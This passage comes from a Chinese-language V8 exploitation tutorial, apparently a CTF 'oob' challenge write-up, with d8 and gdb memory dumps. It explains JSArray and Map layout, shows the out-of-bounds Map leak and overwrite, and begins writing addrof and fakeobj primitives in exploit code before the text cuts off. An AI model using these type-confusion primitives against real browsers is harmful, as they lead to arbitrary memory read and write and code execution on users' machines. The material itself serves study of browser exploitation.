-<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>V8<span class="w"> </span>version<span class="w"> </span><span class="m">7</span>.5.0<span class="w"> </span><span class="o">(</span>candidate<span class="o">)</span>
-<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>
-<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>d8&gt;<span class="w"> </span>var<span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="m">1</span>.1,<span class="w"> </span><span class="m">2</span>.2<span class="o">]</span><span class="p">;</span>
-<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>undefined
-<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>d8&gt;<span class="w"> </span>%DebugPrint<span class="o">(</span>a<span class="o">)</span><span class="p">;</span>
-<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>DebugPrint:<span class="w"> </span>0x1dbbe77cdd79:<span class="w"> </span><span class="o">[</span>JSArray<span class="o">]</span>
-<a id="__codelineno-1-18" name="__codelineno-1-18" href="#__codelineno-1-18"></a><span class="w"> </span>-<span class="w"> </span>map:<span class="w"> </span>0x11304a782ed9<span class="w"> </span>&lt;Map<span class="o">(</span>PACKED_DOUBLE_ELEMENTS<span class="o">)</span>&gt;<span class="w"> </span><span class="o">[</span>FastProperties<span class="o">]</span>
-<a id="__codelineno-1-19" name="__codelineno-1-19" href="#__codelineno-1-19"></a><span class="w"> </span>-<span class="w"> </span>prototype:<span class="w"> </span>0x384656691111<span class="w"> </span>&lt;JSArray<span class="o">[</span><span class="m">0</span><span class="o">]</span>&gt;
-<a id="__codelineno-1-20" name="__codelineno-1-20" href="#__codelineno-1-20"></a><span class="w"> </span>-<span class="w"> </span>elements:<span class="w"> </span>0x1dbbe77cdd59<span class="w"> </span>&lt;FixedDoubleArray<span class="o">[</span><span class="m">2</span><span class="o">]</span>&gt;<span class="w"> </span><span class="o">[</span>PACKED_DOUBLE_ELEMENTS<span class="o">]</span>
-<a id="__codelineno-1-21" name="__codelineno-1-21" href="#__codelineno-1-21"></a><span class="w"> </span>-<span class="w"> </span>length:<span class="w"> </span><span class="m">2</span>
-<a id="__codelineno-1-22" name="__codelineno-1-22" href="#__codelineno-1-22"></a><span class="w"> </span>-<span class="w"> </span>properties:<span class="w"> </span>0x172dc3640c71<span class="w"> </span>&lt;FixedArray<span class="o">[</span><span class="m">0</span><span class="o">]</span>&gt;<span class="w"> </span><span class="o">{</span>
-<a id="__codelineno-1-23" name="__codelineno-1-23" href="#__codelineno-1-23"></a><span class="w">    </span><span class="c1">#length: 0x075e9d5801a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span>
-<a id="__codelineno-1-24" name="__codelineno-1-24" href="#__codelineno-1-24"></a><span class="w"> </span><span class="o">}</span>
-<a id="__codelineno-1-25" name="__codelineno-1-25" href="#__codelineno-1-25"></a><span class="w"> </span>-<span class="w"> </span>elements:<span class="w"> </span>0x1dbbe77cdd59<span class="w"> </span>&lt;FixedDoubleArray<span class="o">[</span><span class="m">2</span><span class="o">]</span>&gt;<span class="w"> </span><span class="o">{</span>
-<a id="__codelineno-1-26" name="__codelineno-1-26" href="#__codelineno-1-26"></a><span class="w">           </span><span class="m">0</span>:<span class="w"> </span><span class="m">1</span>.1
-<a id="__codelineno-1-27" name="__codelineno-1-27" href="#__codelineno-1-27"></a><span class="w">           </span><span class="m">1</span>:<span class="w"> </span><span class="m">2</span>.2
-<a id="__codelineno-1-28" name="__codelineno-1-28" href="#__codelineno-1-28"></a><span class="w"> </span><span class="o">}</span>
-<a id="__codelineno-1-29" name="__codelineno-1-29" href="#__codelineno-1-29"></a>0x11304a782ed9:<span class="w"> </span><span class="o">[</span>Map<span class="o">]</span>
-<a id="__codelineno-1-30" name="__codelineno-1-30" href="#__codelineno-1-30"></a><span class="w"> </span>-<span class="w"> </span>type:<span class="w"> </span>JS_ARRAY_TYPE
-<a id="__codelineno-1-31" name="__codelineno-1-31" href="#__codelineno-1-31"></a><span class="w"> </span>-<span class="w"> </span>instance<span class="w"> </span>size:<span class="w"> </span><span class="m">32</span>
-<a id="__codelineno-1-32" name="__codelineno-1-32" href="#__codelineno-1-32"></a><span class="w"> </span>-<span class="w"> </span>inobject<span class="w"> </span>properties:<span class="w"> </span><span class="m">0</span>
-<a id="__codelineno-1-33" name="__codelineno-1-33" href="#__codelineno-1-33"></a><span class="w"> </span>-<span class="w"> </span>elements<span class="w"> </span>kind:<span class="w"> </span>PACKED_DOUBLE_ELEMENTS
-<a id="__codelineno-1-34" name="__codelineno-1-34" href="#__codelineno-1-34"></a><span class="w"> </span>-<span class="w"> </span>unused<span class="w"> </span>property<span class="w"> </span>fields:<span class="w"> </span><span class="m">0</span>
-<a id="__codelineno-1-35" name="__codelineno-1-35" href="#__codelineno-1-35"></a><span class="w"> </span>-<span class="w"> </span>enum<span class="w"> </span>length:<span class="w"> </span>invalid
-<a id="__codelineno-1-36" name="__codelineno-1-36" href="#__codelineno-1-36"></a><span class="w"> </span>-<span class="w"> </span>back<span class="w"> </span>pointer:<span class="w"> </span>0x11304a782e89<span class="w"> </span>&lt;Map<span class="o">(</span>HOLEY_SMI_ELEMENTS<span class="o">)</span>&gt;
-<a id="__codelineno-1-37" name="__codelineno-1-37" href="#__codelineno-1-37"></a><span class="w"> </span>-<span class="w"> </span>prototype_validity<span class="w"> </span>cell:<span class="w"> </span>0x075e9d580609<span class="w"> </span>&lt;Cell<span class="w"> </span><span class="nv">value</span><span class="o">=</span><span class="w"> </span><span class="m">1</span>&gt;
-<a id="__codelineno-1-38" name="__codelineno-1-38" href="#__codelineno-1-38"></a><span class="w"> </span>-<span class="w"> </span>instance<span class="w"> </span>descriptors<span class="w"> </span><span class="c1">#1: 0x384656691f49 &lt;DescriptorArray[1]&gt;</span>
-<a id="__codelineno-1-39" name="__codelineno-1-39" href="#__codelineno-1-39"></a><span class="w"> </span>-<span class="w"> </span>layout<span class="w"> </span>descriptor:<span class="w"> </span><span class="o">(</span>nil<span class="o">)</span>
-<a id="__codelineno-1-40" name="__codelineno-1-40" href="#__codelineno-1-40"></a><span class="w"> </span>-<span class="w"> </span>transitions<span class="w"> </span><span class="c1">#1: 0x384656691eb9 &lt;TransitionArray[4]&gt;Transition array #1:</span>
-<a id="__codelineno-1-41" name="__codelineno-1-41" href="#__codelineno-1-41"></a><span class="w">     </span>0x172dc3644ba1<span class="w"> </span>&lt;Symbol:<span class="w"> </span><span class="o">(</span>elements_transition_symbol<span class="o">)</span>&gt;:<span class="w"> </span><span class="o">(</span>transition<span class="w"> </span>to<span class="w"> </span>HOLEY_DOUBLE_ELEMENTS<span class="o">)</span><span class="w"> </span>-&gt;<span class="w"> </span>0x11304a782f29<span class="w"> </span>&lt;Map<span class="o">(</span>HOLEY_DOUBLE_ELEMENTS<span class="o">)</span>&gt;
-<a id="__codelineno-1-42" name="__codelineno-1-42" href="#__codelineno-1-42"></a>
-<a id="__codelineno-1-43" name="__codelineno-1-43" href="#__codelineno-1-43"></a><span class="w"> </span>-<span class="w"> </span>prototype:<span class="w"> </span>0x384656691111<span class="w"> </span>&lt;JSArray<span class="o">[</span><span class="m">0</span><span class="o">]</span>&gt;
-<a id="__codelineno-1-44" name="__codelineno-1-44" href="#__codelineno-1-44"></a><span class="w"> </span>-<span class="w"> </span>constructor:<span class="w"> </span>0x384656690ec1<span class="w"> </span>&lt;JSFunction<span class="w"> </span>Array<span class="w"> </span><span class="o">(</span><span class="nv">sfi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x75e9d58aca1<span class="o">)</span>&gt;
-<a id="__codelineno-1-45" name="__codelineno-1-45" href="#__codelineno-1-45"></a><span class="w"> </span>-<span class="w"> </span>dependent<span class="w"> </span>code:<span class="w"> </span>0x172dc36402c1<span class="w"> </span>&lt;Other<span class="w"> </span>heap<span class="w"> </span>object<span class="w"> </span><span class="o">(</span>WEAK_FIXED_ARRAY_TYPE<span class="o">)</span>&gt;
-<a id="__codelineno-1-46" name="__codelineno-1-46" href="#__codelineno-1-46"></a><span class="w"> </span>-<span class="w"> </span>construction<span class="w"> </span>counter:<span class="w"> </span><span class="m">0</span>
-<a id="__codelineno-1-47" name="__codelineno-1-47" href="#__codelineno-1-47"></a>
-<a id="__codelineno-1-48" name="__codelineno-1-48" href="#__codelineno-1-48"></a><span class="o">[</span><span class="m">1</span>.1,<span class="w"> </span><span class="m">2</span>.2<span class="o">]</span>
-</code></pre></div>
-<p>这是很多信息。让我们只查看内存中的数组。请记住，指针是有标记的，需要您在检查之前从中减去 1：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>gef➤<span class="w">  </span>x/4gx<span class="w"> </span>0x1dbbe77cdd79-1
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>0x1dbbe77cdd78:<span class="w"> </span>0x000011304a782ed9<span class="w">  </span>0x0000172dc3640c71<span class="w"> </span>&lt;--<span class="w"> </span>JSArray
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>0x1dbbe77cdd88:<span class="w"> </span>0x00001dbbe77cdd59<span class="w">  </span>0x0000000200000000
-</code></pre></div>
-<p>现在，与提供给我们的调试信息相印证，我们知道第一个地址对应于这个数组的 <code>Map</code>。第二个地址对应于数组<code>的属性。</code> 第三个地址对应于此数组的<code>元素</code>，定义为 <code>FixedDoubleArray[2]。</code> 我们可以看到 <code>elements</code> 指针指向此数组之前的内存地址。现在查看<code>元素</code>，我们发现：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>gef➤<span class="w">  </span>x/10gx<span class="w"> </span>0x00001dbbe77cdd59-1<span class="w">  </span>&lt;-<span class="w"> </span>access<span class="w"> </span>the<span class="w"> </span>elements<span class="w"> </span>pointer
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>0x1dbbe77cdd58:<span class="w"> </span>0x0000172dc36414f9<span class="w">  </span>0x0000000200000000<span class="w"> </span>&lt;--<span class="w"> </span>FixedDoubleArray
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>0x1dbbe77cdd68:<span class="w"> </span>0x3ff199999999999a<span class="w">  </span>0x400199999999999a
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>0x1dbbe77cdd78:<span class="w"> </span>0x000011304a782ed9<span class="w">  </span>0x0000172dc3640c71<span class="w"> </span>&lt;--<span class="w"> </span>JSArray
-<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>0x1dbbe77cdd88:<span class="w"> </span>0x00001dbbe77cdd59<span class="w">  </span>0x0000000200000000
-<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>0x1dbbe77cdd98:<span class="w"> </span>0x0000172dc3640941<span class="w">  </span>0x00000adc678412a2
-<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>gef➤<span class="w">  </span>p/f<span class="w"> </span>0x3ff199999999999a
-<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="nv">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">1</span>.1000000000000001
-<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>gef➤<span class="w">  </span>p/f<span class="w"> </span>0x400199999999999a
-<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="nv">$2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="m">2</span>.2000000000000002
-</code></pre></div>
-<p>因此，<code>var a</code> 是一个 <code>JSArray</code>，它的 <code>elements</code> 指针指向位于 <code>&amp;JSArray-0x30</code> 的 <code>FixedDoubleArray</code>（它有自己的 <code>Map</code>），数组值从 <code>elements[2]</code> 开始内联。<code>0x0000000200000000</code> 是对应于 <code>FixedDoubleArray</code> 长度的 <code>Smi</code>（在本例中为 2，因为请记住，<code>Smi</code> 的值为 <code>&lt;&lt; 32</code>）。</p>
-<p>内联”是指 <code>FixedDoubleArray</code> 中存储的数组值是<strong>紧凑地存储在数组结构中，而没有额外的结构或内存分配</strong>，即数组的值直接存储在 <code>FixedDoubleArray</code> 中，而不是以其他形式（如堆分配的对象）存储。</p>
-<p><img alt="image-20250717170240208" src="C:\Users\sxy\AppData\Roaming\Typora\typora-user-images\image-20250717170240208.png" /></p>
-<p>我们终于可以回答“数组末尾之后存在什么”的问题。如果我们访问 <code>a.oob（），</code> 它将访问 <code>JSArray</code> 的 <code>Map</code>，因为这是紧跟在 <code>FixedDoubleArray</code> 的最后一个索引之后的内容。</p>
-<p>让我们测试一下。我们不能只在调试版本上执行 <code>a.oob（），</code> 因为调试版本具有防止越界访问的运行时断言（它可以帮助模糊测试程序捕获越界访问等）。我们可以看到 <code>a.oob（）</code> 对 release 版本的影响：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>gef➤<span class="w">  </span>run<span class="w"> </span>--allow-natives-syntax<span class="w"> </span>--shell<span class="w"> </span>./pwn.js<span class="w"> </span>
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>Starting<span class="w"> </span>program:<span class="w"> </span>/home/pwn/v8/v8/out.gn/x64.release/d8<span class="w"> </span>--allow-natives-syntax<span class="w"> </span>--shell<span class="w"> </span>./util.js
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="o">[</span>Thread<span class="w"> </span>debugging<span class="w"> </span>using<span class="w"> </span>libthread_db<span class="w"> </span>enabled<span class="o">]</span>
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>Using<span class="w"> </span>host<span class="w"> </span>libthread_db<span class="w"> </span>library<span class="w"> </span><span class="s2">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="o">[</span>New<span class="w"> </span>Thread<span class="w"> </span>0x7ffff661c700<span class="w"> </span><span class="o">(</span>LWP<span class="w"> </span><span class="m">2334</span><span class="o">)]</span>
-<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>V8<span class="w"> </span>version<span class="w"> </span><span class="m">7</span>.5.0<span class="w"> </span><span class="o">(</span>candidate<span class="o">)</span>
-<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
-<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>d8&gt;<span class="w"> </span>var<span class="w"> </span><span class="nv">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="m">1</span>.1,<span class="w"> </span><span class="m">2</span>.2<span class="o">]</span><span class="p">;</span>
-<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>undefined
-<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>d8&gt;<span class="w"> </span>%DebugPrint<span class="o">(</span>a<span class="o">)</span><span class="p">;</span>
-<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>0x207f7ce4e139<span class="w"> </span>&lt;JSArray<span class="o">[</span><span class="m">2</span><span class="o">]</span>&gt;
-<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a><span class="o">[</span><span class="m">1</span>.1,<span class="w"> </span><span class="m">2</span>.2<span class="o">]</span>
-<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>d8&gt;<span class="w"> </span>a.oob<span class="o">()</span><span class="p">;</span><span class="w">         </span>
-<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a><span class="m">2</span>.8870439231963e-311<span class="w">  </span>&lt;-<span class="w"> </span>As<span class="w"> </span>explained,<span class="w"> </span>we<span class="w"> </span>get<span class="w"> </span>a<span class="w"> </span>floating<span class="w"> </span>point<span class="w"> </span>representation
-<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>d8&gt;<span class="w"> </span><span class="s2">&quot;0x&quot;</span><span class="w"> </span>+<span class="w"> </span>ftoi<span class="o">(</span>a.oob<span class="o">())</span>.toString<span class="o">(</span><span class="m">16</span><span class="o">)</span><span class="p">;</span>
-<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="s2">&quot;0x55088482ed9&quot;</span>
-<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
-<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>gef➤<span class="w">  </span>x/4gx<span class="w"> </span>0x207f7ce4e139-1
-<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>0x207f7ce4e138:<span class="w"> </span>0x0000055088482ed9<span class="w">  </span>0x00001c26fc480c71
-<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>0x207f7ce4e148:<span class="w"> </span>0x0000207f7ce4e119<span class="w">  </span>0x0000000200000000
-</code></pre></div>
-<p>如你所见，<code>a.oob（）</code> 返回 <code>0x55088482ed9</code>，它与 <code>a</code> 的 Map 值相同（请记住，在内存中检查 <code>a</code> 时，Map 是第一个地址）。我们使用 <code>ftoi</code> 将浮点信息泄漏（Map 的地址）转换为十六进制表示。</p>
-<h2 id="_5">什么是地图？<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
-<p>既然我们知道我们有能力覆盖 <code>JSArray</code> 的 <code>Map</code>，那么我们必须了解什么是 Map，以便弄清楚如何利用此漏洞。</p>
-<p>本节将仅简要介绍什么是 Map。<a href="https://twitter.com/5aelo">Saelo</a> 在他的 phrack 论文<a href="http://www.phrack.org/papers/jit_exploitation.html">中</a>对此进行了更深入的介绍。如果需要，我敦促读者阅读它。</p>
-<p>Saelo 的 Phrack 论文说：</p>
-<blockquote>
-<p>对象的 Map（数组是对象）是一种数据结构，其中包含如下信息：</p>
-<ul>
-<li>对象的动态类型，即 String、Uint8Array、HeapNumber、...</li>
-<li>对象的大小（以字节为单位）</li>
-<li>对象的属性及其存储位置</li>
-<li>数组元素的类型，例如未装箱的双精度或标记指针</li>
-<li>对象的原型（如果有）</li>
-</ul>
-<p>虽然属性名称通常存储在 Map 中，但属性值存储在对象本身的几个可能区域之一中。然后，Map 会提供属性值在相应区域中的确切位置。</p>
-</blockquote>
-<p>实质上，Map 定义了应如何访问对象。无论你是通过执行 <code>object[“field”]</code> 来访问一个对象，还是通过执行 <code>array[index]</code> 来访问一个数组，该对象/数组的 Map 都会告诉 JS 引擎在内存中的什么位置找到该特定元素。首先使用 Map 的原因是查找值非常昂贵。地图就像一本字典。如果多个对象/数组具有相同的布局，则可以共享同一映射。同样，请查看 saelo 的 phrack paper 了解更多详情。</p>
-<p>例如，还记得上面的 <code>JSArray</code> 吗？如果您尝试访问 <code>a[0]</code>，<code>JSArray</code> 的 Map 将告诉 JS 引擎转到数组，访问其 <code>elements</code> 指针，并返回 <code>elements[2]</code> 处的值，因为它对应于 <code>1.1</code> 的索引 0 处的值（如果这没有意义，请向上滚动）。</p>
-<p>请记住，我们有能力用我们自己的 Map 覆盖数组的 <code>Map</code>。这样，如果我们用另一个数组的 map 覆盖一个数组的 map，我们可能会在 JS 引擎中造成类型混淆。</p>
-<p>为了了解我们如何滥用这一点，让我们看看不同数组的 map 是什么样子的。我们以 Object 数组为例：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>d8&gt;<span class="w"> </span>var<span class="w"> </span><span class="nv">obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">{</span><span class="s2">&quot;A&quot;</span>:1.1<span class="o">}</span><span class="p">;</span>
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>undefined
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>d8&gt;<span class="w"> </span>var<span class="w"> </span><span class="nv">obj_arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span>obj<span class="o">]</span><span class="p">;</span>
-<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>undefined
-<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>d8&gt;<span class="w"> </span>%DebugPrint<span class="o">(</span>obj<span class="o">)</span><span class="p">;</span>
-<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>0x21885d38e0d9<span class="w"> </span>&lt;Object<span class="w"> </span><span class="nv">map</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>0x17d0ea80ab39&gt;
-<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="o">{</span>A:<span class="w"> </span><span class="m">1</span>.1<span class="o">}</span>
-<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>d8&gt;<span class="w"> </span>%DebugPrint<span class="o">(</span>obj_arr<span class="o">)</span><span class="p">;</span>
-<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>0x21885d390561<span class="w"> </span>&lt;JSArray<span class="o">[</span><span class="m">1</span><span class="o">]</span>&gt;
-<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="o">[{</span>A:<span class="w"> </span><span class="m">1</span>.1<span class="o">}]</span>
-<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
-<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>gef➤<span class="w">  </span>x/4gx<span class="w"> </span>0x21885d390561-1
-<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>0x21885d390560:<span class="w"> </span>0x000017d0ea802f79<span class="w">  </span>0x0000099148780c71
-<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>0x21885d390570:<span class="w"> </span>0x000021885d390549<span class="w">  </span>0x0000000100000000
-<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>gef➤<span class="w">  </span>x/4gx<span class="w"> </span>0x000021885d390549-1<span class="w"> </span>&lt;-<span class="w"> </span>access<span class="w"> </span>elements<span class="w"> </span>pointer
-<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>0x21885d390548:<span class="w"> </span>0x0000099148780801<span class="w">  </span>0x0000000100000000
-<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>0x21885d390558:<span class="w"> </span>0x000021885d38e0d9<span class="w">  </span>0x000017d0ea802f79
-</code></pre></div>
-<p>如您所见，对象数组的 <code>Map</code> 略有不同。float 数组在索引 0 处具有 float 值，而 object 数组在同一位置具有实际 <code>obj</code> 的地址。如果你尝试访问 <code>obj_arr[0]</code>，它不仅会打印出索引 <code>0 处 obj</code> 的内存地址的浮点表示，还会以某种方式解析它并打印 <code>{A： 1.1}</code>。</p>
-<p>那么，如果我们泄漏了浮点数组的 map 并用它覆盖了对象数组的 map，会发生什么呢？它不应该将索引 0 视为内存地址，而应该将其视为 float 值。访问索引 0 应该会将 <code>obj</code> 的地址作为浮点数泄露，对吧？</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>d8&gt; var float_arr_map = float_arr.oob();
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>undefined
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>d8&gt; var obj = {&quot;A&quot;:1.1};
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>undefined
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>d8&gt; var obj_arr = [obj];
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>undefined
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>d8&gt; obj_arr.oob(float_arr_map); &lt;- overwrite obj_arr&#39;s map
-<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>undefined
-<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>d8&gt; &quot;0x&quot; + ftoi(obj_arr[0]).toString(16);
-<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>&quot;0x3541b65506a9&quot;
-<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>d8&gt; %DebugPrint(obj);
-<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>0x3541b65506a9 &lt;Object map = 0x391a4148ab39&gt;
-<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>{A: 1.1}
-</code></pre></div>
-<p>成功！在 JS 引擎开发术语中，这就是所谓的 <code>addrof</code> 原语。与此相反（如果我们将内存地址放在 float 数组的索引 0 并将其 map 更改为对象数组的 map）称为 <code>fakeobj</code> 原语，因为它允许您将 fake object 放置在内存中的任何位置，以便读取和写入它。我们可以将这个假对象放在一个内存区域中，在那里我们可以控制它的 Map 和<code>元素</code>指针，这样我们就可以很容易地读取和写入任意内存地址。</p>
-<p>现在，我们可以将这些函数作为 <code>addrof</code> 和 <code>fakeobj</code> 函数添加到 <code>exploit.js</code> 脚本中，如下所示：</p>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="c1">/// Construct addrof primitive</span>
-<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a><span class="kd">var</span><span class="w"> </span><span class="nx">temp_obj</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="s2">&quot;A&quot;</span><span class="o">:</span><span class="mf">1</span><span class="p">};</span>
-<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kd">var</span><span class="w"> </span><span class="nx">obj_arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="nx">temp_obj</span><span class="p">];</span>
-<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a><span class="kd">var</span><span class="w"> </span><span class="nx">fl_arr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="mf">1.1</span><span class="p">,</span><span class="w"> </span><span class="mf">1.2</span><span class="p">,</span><span class="w"> </span><span class="mf">1.3</span><span class="p">,</span><span class="w"> </span><span class="mf">1.4</span><span class="p">];</span>
-<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="kd">var</span><span class="w"> </span><span class="nx">map1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
-<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a><span class="kd">var</span><span class="w"> </span><span class="nx">map2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">fl_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
-<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
-<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="kd">function</span><span class="w"> </span><span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
-<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a><span class="w">    </span><span class="c1">// First, put the obj whose address we want to find into index 0</span>
-<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">    </span><span class="nx">obj_arr</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">in_obj</span><span class="p">;</span>
-<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
-<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w">    </span><span class="c1">// Change the obj array&#39;s map to the float array&#39;s map</span>
-<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="w">    </span><span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">map2</span><span class="p">);</span>
-<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>
-<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a><span class="w">    </span><span class="c1">// Get the address by accessing index 0</span>
-<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">addr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">obj_arr</span><span class="p">[</span><span class="mf">0</span><span class="p">];</span>
-<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>
-<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a><span class="w">    </span><span class="c1">// Set the map back</span>
